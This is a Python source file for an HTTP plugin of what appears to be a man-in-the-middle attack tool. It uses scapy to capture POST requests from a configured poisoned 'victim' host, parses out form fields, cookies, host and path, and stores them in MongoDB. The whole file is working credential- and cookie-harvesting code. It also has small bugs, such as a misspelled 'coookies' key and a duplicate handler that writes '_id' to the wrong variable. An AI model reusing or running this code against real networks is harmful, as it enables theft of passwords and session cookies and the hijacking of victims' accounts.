import logging
import datetime
from scapy.all import *
import pymongo
import bson
import urlparse

class plugin(object):
    log = None
    config = None
    database = None
    modified = False

    def __init__(self, config, database):
        self.log = logging.getLogger("mitm.traffic.http")
        self.config = config
        self.database = database
        self.log.info("http plugin loaded")

    def invoke(self, packet):
        self.modified = False

        insert_data = {}

        if (packet.haslayer(Raw)) \
            and (packet[IP].src == self.config.get("poison").get("victim")) \
            and (packet[Raw].load.find("POST") >= 0):
            header, data = packet[Raw].load.split("\r\n\r\n", 1)
            headers = header.split("\r\n")

            for header_line in headers:
                if header_line.find("POST") >= 0:
                    method, url, http_ver = header_line.split(' ')
                    url = urlparse.urlparse(url)
                    insert_data["path"] = url.path
                    insert_data["query"] = url.query
                    insert_data["params"] = url.params

                else:
                    name, value = header_line.split(': ')
                    if name == "Cookie":
                        insert_data["coookies"] = dict(urlparse.parse_qsl(value))
                    elif name == "Host":
                        insert_data["host"] = value

            insert_data["data"] = dict(urlparse.parse_qsl(data))

            try:
                self.database.http.insert(insert_data, safe=True)
            except pymongo.errors.DuplicateKeyError:
                if self.config.get("traffic").get("allow_dublicates"):
                    data["_id"] = bson.objectid.ObjectId()
                    self.database.http.insert(insert_data, safe=True)
